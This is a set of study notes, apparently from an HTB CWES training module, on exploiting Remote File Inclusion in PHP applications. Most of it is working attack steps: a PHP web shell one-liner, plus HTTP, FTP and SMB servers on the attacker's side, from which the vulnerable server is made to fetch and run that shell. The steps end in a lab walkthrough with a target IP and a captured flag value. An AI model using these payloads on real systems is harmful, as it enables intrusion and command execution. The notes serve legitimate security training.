---
tags: [CWES, HTB, technical-reference]
module: "File Inclusion"
source_file: "CWES.xmind"
---

# Remote File Inclusion (RFI)

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## This allows two main benefits

### Enumerating local-only ports and web applications (i.e. SSRF)

### Gaining remote code execution by including a malicious script that we host

## Verify RFI

### We can check whether this setting is enabled through LFI, as we did in the previous section:

### echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

- allow_url_include = On
  - we should always start by trying to include a local URL
    - /index.php?language=http://127.0.0.1:80/index.php
      - Duplicate index.php means success
## Remote Code Execution with RFI

### creating a malicious script in the language of the web application

- echo '<?<!-- -->php system($_GET["cmd"]); ?>' > shell.php
  - python3 -m http.server 443
- http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
  - uid=33
    - since it also php the server execute it and give the utput in vectim application
## FTP

### may also be useful in case http ports are blocked by a firewall or the http:// string gets blocked by a WAF

### start a basic FTP server

- sudo python -m pyftpdlib -p 21
### http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id

- PHP tries to authenticate as an anonymous user
### If the server requires valid authentication, then the credentials can be specified in the URL

- curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'
  - uid=33(www-data)
## SMB (Windows server)

### Windows treats files on remote SMB servers as normal files

### Start SMB Server using impacket

- impacket-smbserver -smb2support share $(pwd)
### include our script by using a UNC path

- http://<SERVER_IP>:<PORT>/index.php?language=\\\<OUR_IP>\share\shell.php&cmd=whoami
  - NT AUTHORITY\IUSR
    - more likely to work if we were on the same network
## LAB

### Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /

- http://10.129.29.114/index.php?language=http://127.0.0.1:80/index.php
  - Dupliacte index.php
- echo '<?<!-- -->php system($_GET["cmd"]); ?>' > shell.php
  - python3 -m http.server 443
- http://10.129.29.114/index.php?language=http://10.10.14.4:443/shell.php&cmd=cat+/exercise/flag.txt
  - 99a8fc05f033f2fc0cf9a6f9826f83f4
